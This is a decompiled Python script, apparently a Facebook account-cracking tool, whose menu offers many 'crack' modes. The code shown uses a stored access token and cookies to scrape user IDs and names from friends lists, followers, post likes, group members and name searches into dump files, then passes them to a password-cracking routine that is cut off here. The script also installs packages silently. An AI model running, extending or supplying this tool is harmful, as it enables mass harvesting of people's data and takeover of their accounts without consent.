# Decompile by SHANKAR-XD
# Time Succes decompile : 2022-04-14 19:32:14.016135
import os,sys
import rich
try: import requests
except ModuleNotFoundError:print("[!] Sedang Install Module requests");os.system("python -m pip install requests &> /dev/null")
try: import bs4
except ModuleNotFoundError:print("[!] Sedang Install Module bs4");os.system("python -m pip install bs4 &> /dev/null")
try: import mechanize
except ModuleNotFoundError:print("[!] Sedang Install Module mechanize");os.system("python -m pip install mechanize &> /dev/null")
try: import gTTS
except ModuleNotFoundError: os.system("python -m pip install gTTS &> /dev/null")

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import sys, os, subprocess, platform, struct
import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json 
import requests as req
import time,random,json
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup
from random import choice as pilih
from concurrent.futures import ThreadPoolExecutor as __Kiky__
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from datetime import datetime
from urllib.parse import quote
from datetime import date
null=open(os.devnull, "w")
insta= subprocess.call(["dpkg","-s","play-audio"],stdout=null,stderr=subprocess.STDOUT)
null.close()
if insta !=0:os.system('pkg install play-audio -y &> /dev/null')
try:os.mkdir("dump")
except:pass
try:os.mkdir("Hasil")
except:pass
import uuid
if ("linux" in sys.platform.lower()):
	II='\x1b[1;32m'
	I='\x1b[0;32m'
	C='\x1b[0;36m'
	M='\x1b[0;31m'
	U='\x1b[0;35m'
	K='\x1b[0;33m'
	P='\x1b[00m'
	H='\x1b[0;90m'
	Q="\x1b[00m"
	O='\033[38;2;255;127;0;1m' #ORANGE
	B = '\x1b[0;94m' # BIRU.
	war = f"[{C}•{Q}]-->"
else:
	II=''
	I=''
	C=''
	M=''
	U=''
	K=''
	P=''
	H=''
	Q=""
	O='' #ORANGE
	B='' # BIRU.
	war = "[•]-->"
jarak = "     "
ubahP = []
pwbaru = []
data = {}
data2 = {}
loop = 0
loop = 0
ok = []
cp = []
ttl = []
id = []
nampung = []
data,data2={},{}
ubahP,pwBaru=[],[]
id_group = []
komen = []
opost = 0


current = datetime.now()
durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day
current = datetime.now()
waktuu = str(datetime.now().strftime("%Y-%m-%d"))
waktu = str(datetime.now().strftime("%Y%m%d"))
jamz = datetime.now().strftime('%H:%M:%S')
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}





def jalan(z):
	for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.009)
def play_mpv(x):
	try:os.popen("play-audio "+x)
	except:pass
class menu:
	def __init__(self):
		os.system("clear")
		self.mani()
	
	def tampilan_logo(self):
		xnxx=pilih([B,C,II,Q,U,K,O,M])
		vp=Q
		jalan(f"""{xnxx}
{II}███████╗ ██████╗ ██╗  ██╗ █████╗ ██╗██╗     
██╔════╝██╔═══██╗██║  ██║██╔══██╗██║██║     
███████╗██║   ██║███████║███████║██║██║     
╚════██║██║   ██║██╔══██║██╔══██║██║██║     
███████║╚██████╔╝██║  ██║██║  ██║██║███████╗
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝                                                               
   \033[44m\033[1;37m Script information  \033[41m\033[1;37m Version 2.0 \x1b[0m\n
 Author   : {P}SOHAIL WAZIR {Q}
 Coded    : {P}SSK WAZIR CODE{Q}
 Whatsapp : 923130997378
 Facebook : Sohail Wazir ({II} Please Follow {Q})
 Github   : - love-sohail
 """)


	def mani(self):
		try:token = open(".login.txt","r").read()
		except:login()
		try:cookie = open(".cookie.txt","r").read()
		except:pass
		try:
			xnxzx = ""+cookie
			zza = "Token And Cookie"
		except:
			zza = "Token"
		try:
			nama = ses.get(f"https://graph.facebook.com/me?&access_token={token}").json()["name"]
			idz = ses.get(f"https://graph.facebook.com/me?&access_token={token}").json()["id"]
		except:
			os.system('rm -rf .login.txt')
			os.system('rm -rf .cookie.txt')
			jalan(" |-->Token Kadaluarsa");time.sleep(0.25)
			jalan(" |-->Jalanlan Ulang Script");time.sleep(0.25)
			os.sys.exit()
		self.tampilan_logo()
		jalan(f"""{Q}[{C}•{Q}] {O}Account Info/Menu{Q}

 Nama Akun      : {O}{nama}{Q}
 Id Akun        : {M}{idz}{Q}
 Status Login   : {II}{zza}{Q}
 Status ApiKey  : {II}Premium{Q}
 Apikey/Lisensi : {II}ZXSJDSAB45J{Q}
 ┌───────────────────────── MenuScript ────────────────────────┐""")
		print(f' │-->1. Crack public and friend ({O} Fast {Q})	    	{II}ON{Q}     │');time.sleep(0.25)
		print(f' │-->2. Crack public and friend				{II}ON{Q}     │');time.sleep(0.25)
		print(f' │-->3. Crack Dari Followers				{II}ON{Q}     │');time.sleep(0.25)
		print(f' │-->4. Crack Followers Id  ({O}Ultimate Dump{Q})		{II}ON{Q}     │');time.sleep(0.25)
		print(f' │-->5. Crack From Name Search ({O}Not Login{Q})		{II}ON{Q}     │');time.sleep(0.25)
		print(f' │-->6. Crack From Like Posts			{II}ON{Q}     │');time.sleep(0.25)
		print(f' │-->7. Crack From File		 			{II}ON{Q}     |');time.sleep(0.25)
		print(f' │-->8. Crack From Comments				{M}OFF{Q}    |');time.sleep(0.25)
		print(f' │-->9. Crack From Member Group				{II}ON{Q}     |');time.sleep(0.25)
		print(f' │-->10.Crack from Saran Teamn				{M}OFF{Q}    |');time.sleep(0.25)
		print(f' │-->11.Check Number of Friends ({O}Prone Check Point{Q})		{II}ON{Q}     |');time.sleep(0.25)
		print(f' │-->12.View Crack Results 				{II}ON{Q}     |');time.sleep(0.25)
		print(f' │-->13.Check Facebook Options Crack Results		{II}ON{Q}     |');time.sleep(0.25)
		print(f' │-->14.Auto Share Bots					{II}ON{Q}     |');time.sleep(0.25)
		print(f' │-->15.Report Script					{II}ON{Q}     |');time.sleep(0.25)
		print(f' │-->16.Token and Cookies Info				{II}ON{Q}     |');time.sleep(0.25)
		print(f' │-->17.See Related Applications Through Crack Results   	{II}ON{Q}     |');time.sleep(0.25)
		print(f' │-->18.Setting User Agent       │');time.sleep(0.25)
		print(f' │-->00.OUT ({M}Remove Token{Q})                                   |');time.sleep(0.25)
		print(f' └─────────────────────────────────────────────────────────────┘');time.sleep(0.25)
		pio = input(f"{Q}[{M}?{Q}]-->Pilihan : ")
		if pio in (""," "):
			jalan(" -->Isi Dengan Benar !!");time.sleep(1)
			menu()
		elif pio in ("01","1"):
			self.public_mass()
			os.sys.exit()
		elif pio in ("02","2"):
			self.public_()
			os.sys.exit()
		elif pio in ("03","3"):
			self.follow_()
			os.sys.exit()
		elif pio in ("04","4"):
			self.dump_follow_ulti()
			os.sys.exit()
		elif pio in ("05","5"):
			self.pencarian_nologin()
			os.sys.exit()
		elif pio in ("06","6"):
			self.likes_()
			os.sys.exit()
		elif pio in ("07","7"):
			self.crack_file()
			os.sys.exit()
		elif pio in ("09","9"):
			self.menu_grup()
			os.sys.exit()
		elif pio in ("11"):
			self.cek_jumlah_teman()
			os.sys.exit()
		elif pio in ("12"):
			self.rek()
			input(war+'Tekan Enter !');time.sleep(3)
			menu()
			os.sys.exit()
		elif pio in ("13"):
			self.check_opsii()
			os.sys.exit()
		elif pio in ("14"):
			self.Share_Post_v2()
			os.sys.exit()
		elif pio in ("15"):
			self.menujuwa()
			os.sys.exit()
		elif pio in ("16"):
			self.hide_tkn()
			os.sys.exit()
		elif pio in ("17"):
			self.cek_apk_hasil_crk()
			os.sys.exit()
		elif pio in ("18"):
			useragent()
			os.sys.exit()
		elif pio in ("00"):
			os.system('rm -rf .login.txt')
			os.system('rm -rf .cookie.txt')
			jalan(" |-->Token Berhasil Dihapus...")
			os.sys.exit()
		else:
			jalan(" -->How much do you want to dump? !!");time.sleep(1)
			menu()

	def public_mass(self):
		try:
			token = open(".login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			exit(war+"Token Failed !!");time.sleep(2)
		try:
			tanya_total = int(input(war+"How much do you want to dump? : "))
		except:tanya_total=1
		namafi = uuid.uuid4().hex[:10].upper()
		dump = open('dump/'+namafi+'.json','w') 
		jalan(" -->Type >"+I+"me"+Q+"< To Dump Your Own Data")
		print(" ")
		print(f"[{M}!{Q}]-->{O}Enter Id or Target Username{Q}")
		print(" ")
		for t in range(tanya_total):
			t +=1
			idt = input(" -->Target %s : "%(t))
			try:
				if idt == "me":idt = "me"
				else:
					payload = {"fburl": "https://free.facebook.com/{}".format(idt), "check": "Lookup"}
					if "facebook" in idt:
						payload = {"fburl": idt, "check": "Lookup"}
					mmk = requests.post("https://lookup-id.com/", data=payload).content
					xxx = par(mmk, "html.parser")
					idtt = xxx.find("span", id="code")
					asw = idtt.text
					idt = asw
			except:idt = idt
			limit = ("10000")
			try:
				if idt == "me" or "me" == idt:
					otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
					op = json.loads(otw.text)
				else:
					jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
					op = json.loads(jok.text)
				try:
					nama = op['name']
				except (KeyError, IOError):
					nama = ("Name Not Found !")

			except Exception as e:
				jalan("-->Sorry ID "+C+idt+Q+" This Was Not Found ! ("+str(e)+")")
				continue
			jalan(" -->Nama   : "+I+nama+Q)
			try:
				dump = open('dump/'+namafi+'.json','a+') 
				r = requests.get("https://graph.facebook.com/"+idt+"?fields=friends.fields(id,name)&access_token="+token)
				z = json.loads(r.text)["friends"]
				for i in z["data"]:
					try:
						uid = i["id"]
						nama = i["name"]
						id.append(uid+"<=>"+nama)
						dump.write(uid+'<=>'+nama+'\n')
					except:pass
				dump.close()
			except KeyError:pass
		id_ = ("%s"%(len(id)))
		if id_ == "0" or "0" == id_:
			jalan(" -->Kemungkinan Idz Yang Anda Masukan Tidak DiPublickan !!")
		else:
			print(f"[{C}•{Q}]-->Total ID : {O}%s%s"%(len(id),Q))
			jalan(" -->Nama Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
			jalan(" -->Please Copy the Dump Result Name !!")
			jalan(" -->Do you want to directly crack with this file (Y/n) : ")
			zz = input(war+'-->Pilih : ')
			if zz in ["Y", "y", "Yes", "1"]:
				crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
				exit()
			else:
				pass
		input(f"[{M}!{Q}] Tekan Enter !!")
		menu()
	def public_(self):
		try:
			token = open(".login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			exit(war+"Token Failed !!");time.sleep(2)
		namafi = uuid.uuid4().hex[:10].upper()
		dump = open('dump/'+namafi+'.json','w') 
		jalan(" -->Ketik >"+I+"me"+Q+"< Untuk Dump Data Sendiri")
		print(" ")
		print(f"[{M}!{Q}]-->{O}Enter Id or Target Username{Q}")
		print(" ")
		idt = input(" -->Target :")
		try:
			if idt == "me":idt = "me"
			else:
				payload = {"fburl": "https://free.facebook.com/{}".format(idt), "check": "Lookup"}
				if "facebook" in idt:
					payload = {"fburl": idt, "check": "Lookup"}
				mmk = requests.post("https://lookup-id.com/", data=payload).content
				xxx = par(mmk, "html.parser")
				idtt = xxx.find("span", id="code")
				asw = idtt.text
				idt = asw
		except:idt = idt
		limit = ("10000")
		try:
			if idt == "me" or "me" == idt:
				otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
				op = json.loads(otw.text)
			else:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
				op = json.loads(jok.text)
			try:
				nama = op['name']
			except (KeyError, IOError):
				nama = ("Name Not Found !")
		except Exception as e:
			jalan("|-->Sorry ID "+C+idt+Q+" Ini Tidak DiTemukan ! ("+str(e)+")")
			time.sleep(2)
			menu()
		jalan(" |-->Nama   : "+I+nama+Q)
		try:
			dump = open('dump/'+namafi+'.json','a+')
			r = requests.get("https://graph.facebook.com/"+idt+"?fields=friends.fields(id,name)&access_token="+token)
			z = json.loads(r.text)["friends"]
			for i in z["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
		id_ = ("%s"%(len(id)))
		if id_ == "0" or "0" == id_:
			jalan(" |-->Kemungkinan Idz Yang Anda Masukan Tidak DiPublickan !!")
		else:
			print(f"[{C}•{Q}]-->Total ID : {O}%s%s"%(len(id),Q))
			jalan(" |-->Nama Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
			jalan(" |-->Please Copy the Dump Result Name !!")
			jalan(" |-->Do you want to directly crack with this file (Y/n) : ")
			zz = input(war+'-->Pilih : ')
			if zz in ["Y", "y", "Yes", "1"]:
				crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
				exit()
			else:
				pass
		input(f"[{M}!{Q}] Tekan Enter !!")
		menu()
	def public_ambil_old(self):
		try:
			token = open(".login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			exit(war+"Token Failed !!");time.sleep(2)
		namafi = uuid.uuid4().hex[:10].upper()
		dump = open('dump/'+namafi+'.json','w') 
		jalan(" |-->Ketik >"+I+"me"+Q+"< Untuk Dump Data Sendiri")
		print(" |")
		print(f"[{M}!{Q}]-->{O}Masukan Idz Atau Username Target{Q}")
		print(" |")
		idt = input(" |-->Target :")
		try:
			if idt == "me":idt = "me"
			else:
				payload = {"fburl": "https://free.facebook.com/{}".format(idt), "check": "Lookup"}
				if "facebook" in idt:
					payload = {"fburl": idt, "check": "Lookup"}
				mmk = requests.post("https://lookup-id.com/", data=payload).content
				xxx = par(mmk, "html.parser")
				idtt = xxx.find("span", id="code")
				asw = idtt.text
				idt = asw
		except:idt = idt
		limit = ("10000")
		try:
			if idt == "me" or "me" == idt:
				otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
				op = json.loads(otw.text)
			else:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
				op = json.loads(jok.text)
			try:
				nama = op['name']
			except (KeyError, IOError):
				nama = ("Nama Tidak DiTemukan !")
		except Exception as e:
			jalan("|-->Maaf ID "+C+idt+Q+" Ini Tidak DiTemukan ! ("+str(e)+")")
			time.sleep(2)
			menu()
		jalan(" |-->Nama   : "+I+nama+Q)
		try:
			dump = open('dump/'+namafi+'.json','a+')
			r = requests.get("https://graph.facebook.com/"+idt+"?fields=friends.fields(id,name)&access_token="+token)
			z = json.loads(r.text)["friends"]
			for i in z["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
		id_ = ("%s"%(len(id)))
		if id_ == "0" or "0" == id_:
			jalan(" |-->Kemungkinan Idz Yang Anda Masukan Tidak DiPublickan !!")
		else:
			print(f"[{C}•{Q}]-->Total ID : {O}%s%s"%(len(id),Q))
			jalan(" |-->Nama Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
			jalan(" |-->Silahkan Copy Nama Hasil Dump Tadi !!")
			jalan(" |-->Apakah Anda Mau Lasung Crack Dengan File Ini (Y/n) : ")
			zz = input(war+'-->Pilih : ')
			if zz in ["Y", "y", "Yes", "1"]:
				crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
				exit()
			else:
				pass
		input(f"[{M}!{Q}] Tekan Enter !!")
		menu()
	def follow_(self):
		try:
			token = open(".login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			exit(war+"Token Failed !!");time.sleep(2)
		namafi = uuid.uuid4().hex[:10].upper()
		dump = open('dump/'+namafi+'.json','w') 
		jalan(" |-->Ketik >"+I+"me"+Q+"< Untuk Dump Data Sendiri")
		print(" |")
		print(f"[{M}!{Q}]-->{O}Masukan Idz Atau Username Target{Q}")
		print(" |")
		idt = input(" |-->Target :")
		try:
			if idt == "me":idt = "me"
			else:
				payload = {"fburl": "https://free.facebook.com/{}".format(idt), "check": "Lookup"}
				if "facebook" in idt:
					payload = {"fburl": idt, "check": "Lookup"}
				mmk = requests.post("https://lookup-id.com/", data=payload).content
				xxx = par(mmk, "html.parser")
				idtt = xxx.find("span", id="code")
				asw = idtt.text
				idt = asw
		except:idt = idt
		limit = ("10000")
		try:
			if idt == "me" or "me" == idt:
				otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
				op = json.loads(otw.text)
			else:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
				op = json.loads(jok.text)
			try:
				nama = op['name']
			except (KeyError, IOError):
				nama = ("Nama Tidak DiTemukan !")
		except Exception as e:
			jalan("|-->Maaf ID "+C+idt+Q+" Ini Tidak DiTemukan ! ("+str(e)+")")
			time.sleep(2)
			menu()
		jalan(" |-->Nama   : "+I+nama+Q)
		try:
			dump = open('dump/'+namafi+'.json','a+')
			for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+token).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
		id_ = ("%s"%(len(id)))
		if id_ == "0" or "0" == id_:
			jalan(" |-->Kemungkinan Idz Yang Anda Masukan Tidak DiPublickan !!")
		else:
			print(f"[{C}•{Q}]-->Total ID : {O}%s%s"%(len(id),Q))
			jalan(" |-->Nama Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
			jalan(" |-->Silahkan Copy Nama Hasil Dump Tadi !!")
			jalan(" |-->Apakah Anda Mau Lasung Crack Dengan File Ini (Y/n) : ")
			zz = input(war+'-->Pilih : ')
			if zz in ["Y", "y", "Yes", "1"]:
				crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
				exit()
			else:
				pass
		input(f"[{M}!{Q}] Tekan Enter !!")
		menu()
	def dump_follow_ulti(self):
		nextt = ""
		try:
			token = open(".login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			exit(war+"Token Failed !!");time.sleep(2)
		namafi = uuid.uuid4().hex[:10].upper()
		dump = open('dump/'+namafi+'.json','w') 
		jalan(" |-->Ketik >"+I+"me"+Q+"< Untuk Dump Data Sendiri")
		print(" |")
		print(f"[{M}!{Q}]-->{O}Masukan Idz Atau Username Target{Q}")
		print(" |")
		idt = input(" |-->Target :")
		try:
			if idt == "me":idt = "me"
			else:
				payload = {"fburl": "https://free.facebook.com/{}".format(idt), "check": "Lookup"}
				if "facebook" in idt:
					payload = {"fburl": idt, "check": "Lookup"}
				mmk = requests.post("https://lookup-id.com/", data=payload).content
				xxx = par(mmk, "html.parser")
				idtt = xxx.find("span", id="code")
				asw = idtt.text
				idt = asw
		except:idt = idt
		limit = ("10000")
		try:
			if idt == "me" or "me" == idt:
				otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
				op = json.loads(otw.text)
			else:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
				op = json.loads(jok.text)
			try:
				nama = op['name']
			except (KeyError, IOError):
				nama = ("Nama Tidak DiTemukan !")
		except Exception as e:
			jalan("|-->Maaf ID "+C+idt+Q+" Ini Tidak DiTemukan ! ("+str(e)+")")
			time.sleep(2)
			menu()
		limit = "5000"
		jalan(" |-->Nama   : "+I+nama+Q)
		jalan(' |-->Tekan CTRL + C Untuk Stop Dump !')

		try:
			dump = open('dump/'+namafi+'.json','a+') 
			for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+token).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				except:pass
			dump.close()
			print(" |-->Total ID : %s"%(len(open("dump/"+namafi+".json","r").readlines())))
		except:pass
		try:
			i = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token).json()["paging"]["next"]
			self.ke_situ(i, namafi)
		except:pass
		id_ = ("%s"%(len(open("dump/"+namafi+".json","r").readlines())))
		if id_ == "0" or "0" == id_:
			jalan(" |-->Kemungkinan Idz Yang Anda Masukan Tidak DiPublickan !!")
		else:
			jalan(" |-->Nama Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
			jalan(" |-->Silahkan Copy Nama Hasil Dump Tadi !!")
			jalan(" |-->Apakah Anda Mau Lasung Crack Dengan File Ini (Y/n) : ")
			zz = input(war+'Pilih : ')
			if zz in ["Y", "y", "Yes", "1"]:
				crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
				exit()
			else:
				pass
		input(war+"Tekan Enter !!")
		menu()


	def ke_situ(self, xnha, namaf):
		id = []
		xnn = xnha
		namaa = namaf
		try:
			dump = open('dump/'+namaf+'.json','a+') 
			for i in requests.get(xnha).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
		print(" |-->Total ID : %s"%(len(open("dump/"+namaf+".json","r").readlines())))
		try:
			i = requests.get(xnha).json()["paging"]["next"]
			self.ke_situ(i, namaa)
		except:pass
	def pencarian_nologin(self):
		namafi = uuid.uuid4().hex[:10].upper()
		dump = open('dump/'+namafi+'.json','w')
		jalan(" |-->Hasil Dump Dari Pencarian Nama DiSimpan : "+O+"dump/"+namafi+".json"+Q)
		try:jum = int(input(" |-->Jumlah Target : "))
		except:jum = 1
		print(f" |-->{O}Masukan Nama Target{Q}")
		print(" |")
		for t in range(jum):
			t +=1
			idt = input(f" |-->Nama : ")
			print(" |")
			self.dump_pencarian(f"https://mbasic.facebook.com/public/{idt}?/locale2=id_ID",namafi)
		crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
		exit()

	def dump_pencarian(self,link,namfi):
		r = parser(ses.get(str(link)).text,'html.parser')
		namaqq = namfi
		try:
			for x in r.find_all('td'):
				try:
					data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x)) 
					for uid,nama in data:
						if 'profile.php?' in uid:
							uid = re.findall('id=(.*)',str(uid))[0]
						elif '<span' in nama:
							nama = re.findall('(.*?)\<',str(nama))[0]
						id.append(uid+'<=>'+nama)
						open('dump/'+namfi+'.json','a+').write(uid+'<=>'+nama+'\n')
					link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
					if(link):
						sys.stdout.write(f"\r |-->Sedang Mengumpulkan {O}{len(id)}{Q} Idz..."),
						sys.stdout.flush()
						self.dump_pencarian(link,namaqq)
				except KeyboardInterrupt:break
		except KeyboardInterrupt:
			os.sys.exit()
	def likes_(self):
		try:
			token = open(".login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			exit(war+"Token Failed !!");time.sleep(2)
		namafi = uuid.uuid4().hex[:10].upper()
		dump = open('dump/'+namafi+'.json','w') 
		print(" |")
		print(" |")
		print(f"[{M}!{Q}]-->{O}Masukan Idz Postingan{Q}")
		print(" |")
		idt = input(" |-->Target :")
		try:
			dump = open('dump/'+namafi+'.json','a+')
			for i in requests.get("https://graph.facebook.com/%s/likes?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
		id_ = ("%s"%(len(id)))
		if id_ == "0" or "0" == id_:
			jalan(" |-->Kemungkinan Idz Yang Anda Masukan Tidak DiPublickan !!")
		else:
			print(f"[{C}•{Q}]-->Total ID : {O}%s%s"%(len(id),Q))
			jalan(" |-->Nama Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
			jalan(" |-->Silahkan Copy Nama Hasil Dump Tadi !!")
			jalan(" |-->Apakah Anda Mau Lasung Crack Dengan File Ini (Y/n) : ")
			zz = input(war+'-->Pilih : ')
			if zz in ["Y", "y", "Yes", "1"]:
				crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
				exit()
			else:
				pass
		input(f"[{M}!{Q}] Tekan Enter !!")
		menu()
	def crack_file(self):
		dirs = os.listdir("dump")
		for file in dirs:
			filex = ("dump/"+file)
			try:
				juma = open(filex,"r").readlines()
				total = ("%s"%(str(len(juma))))
			except:total = ("0")
			print(Q+" |-->"+C+filex+U+"<--|-->"+Q+K+total+Q)
		def pilih_file():
			try:
				file = input(" |-->Nama File : ")
				crackmenu(file).passmenu(file)
				os.sys.exit()
			except FileNotFoundError:
				jalan(" |-->Maaf File Yang Anda Masukan Tidak Ada....")
				time.sleep(1)
				print(" |")
				pilih_file()
			os.sys.exit()
		print(" |")
		pilih_file()
		print(" |")

	def menu_grup(self):
		try:
			cok = open(".cookie.txt","r").read()
		except:
			jalan(" |-->Maaf Anda Belum Login Cookies... Anda Menuju Login Cokies")
			time.sleep(1)
			cookie_me()
			os.sys.exit()
		print(' |')
		print(f' |-->1. Masuakan Idz ({O}Manual{Q})')
		print(f' |-->2. Otomatis ({O}Ambil Dari Grup Sendiri{Q})')
		print(' |')
		qiw = input(" |-->Pilih : ")
		if qiw in (""," "):
			jalan(f' |-->Jangan Kosonv Kontol....')
			time.sleep(1)
			self.menu_grup()
		elif qiw in ("1","01"):
			self.manual_()
			os.sys.exit()
		elif qiw in ("2","02"):
			self.ambil_diri_sendiri(open(".login.txt","r").read())
			os.sys.exit()
		else:
			jalan(f' |-->Isi Dengan Benar Donv....')
			time.sleep(1)
			self.menu_grup()



	def manual_(self):
		namafi = uuid.uuid4().hex[:10].upper()
		dump = open('dump/'+namafi+'.json','w')
		jalan(" |-->Hasil Dump Dari Grup DiSimpan : "+O+"dump/"+namafi+".json"+Q)
		try:
			cok = open(".cookie.txt","r").read()
		except:
			jalan(" |-->Maaf Anda Belum Login Cookies... Anda Menuju Login Cokies")
			time.sleep(1)
			cookie_me()
			os.sys.exit()
		kue = {"cookie":cok}
		print(" |")
		jalan(f" |-->{O}Masuakan Idz Gruop{Q}")
		idg = input(" |-->Target : ")
		url_group = "https://mbasic.facebook.com/browse/group/members/?id="+idg
		self.group(kue, url_group, namafi)
		crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
		exit()
	def group(self, kue, url_group, nama_fi):
		nama_ff = nama_fi
		try:
			sop_dev = parser(ses.get(url_group, cookies=kue).content, "html.parser")
			members = sop_dev.find("div", id="objects_container")
			for dev in members.find_all("table"):
				try:
					user_ = dev["id"].replace("member_", "")
					nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))[0]
					id.append(str(user_)+"<=>"+str(nama_))
					open('dump/'+nama_fi+'.json','a+').write(str(user_)+'<=>'+str(nama_)+'\n')
					sys.stdout.write(f"\r |-->Sedang Mengumpulkan {O}{len(id)}{Q} Idz..."),
					sys.stdout.flush()
				except:pass
			if "Lihat Selengkapnya" in str(sop_dev):
				url = sop_dev.find("a", string="Lihat Selengkapnya")["href"]
				url_grup = "https://mbasic.facebook.com"+url
				self.group(kue, url_grup, nama_ff)
		except:pass
	def ambil_diri_sendiri(self, token):
		namafi = uuid.uuid4().hex[:10].upper()
		dump = open('dump/'+namafi+'.json','w')
		jalan(" |-->Hasil Dump Dari Grup DiSimpan : "+O+"dump/"+namafi+".json"+Q)
		try:
			cok = open(".cookie.txt","r").read()
		except:
			jalan(" |-->Maaf Anda Belum Login Cookies... Anda Menuju Login Cokies")
			time.sleep(1)
			cookie_me()
			os.sys.exit()
		kue = {"cookie":cok}
		no = 0
		try:
			for i in ses.get("https://graph.facebook.com/me/groups?access_token=%s"%(token)).json()["data"]:
				try:
					id_group.append(i["id"])
					no +=1
					print(" |-->%s. %s%s%s<--|-->%s%s%s"%(str(no), U, i["name"], Q, C, i['id'], Q))
				except:pass
		except:
			jalan(" |-->Maaf Token Dan Cookies Anda Sudah Kadaluarsa..")
			try:os.remove(".cookie.txt")
			except:pass
			try:os.remove(".login.txt")
			except:pass
			os.sys.exit()
		jalan(f" |-->{O}Total Idz Grup Terkumpul : {len(id_group)}{Q}")
		for idg in id_group:
			try:
				print("\n |")
				url_group = "https://mbasic.facebook.com/browse/group/members/?id="+idg
				self.group(kue, url_group, namafi)
			except KeyboardInterrupt:break
		crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
		exit()




	def cek_jumlah_teman(self):
		try:
			token = open(".login.txt", "r").read()
			toket = open(".login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			os.sys.exit(war+"Token Failed !!");time.sleep(2)
		print(' |')
		jalan(" |-->Ketik >"+I+"me"+Q+"< Untuk Dump Data Sendiri")
		jalan(" |-->Masukan Idz Atau Username Target")
		print(' |')
		idt = input(" |-->Target :")
		try:
			if idt == "me":idt = "me"
			else:
				payload = {"fburl": "https://free.facebook.com/{}".format(idt), "check": "Lookup"}
				if "facebook" in idt:
					payload = {"fburl": idt, "check": "Lookup"}
				mmk = requests.post("https://lookup-id.com/", data=payload).content
				xxx = par(mmk, "html.parser")
				idtt = xxx.find("span", id="code")
				asw = idtt.text
				idt = asw
		except:idt = idt
		dump = open('.janganedit','w') 
		try:
			dump = open('.janganedit','a+') 
			r = requests.get("https://graph.facebook.com/"+idt+"?fields=friends.fields(id,name)&access_token="+token)
			z = json.loads(r.text)["friends"]
			for i in z["data"]:
				uid = i["id"]
				nama = i["name"]
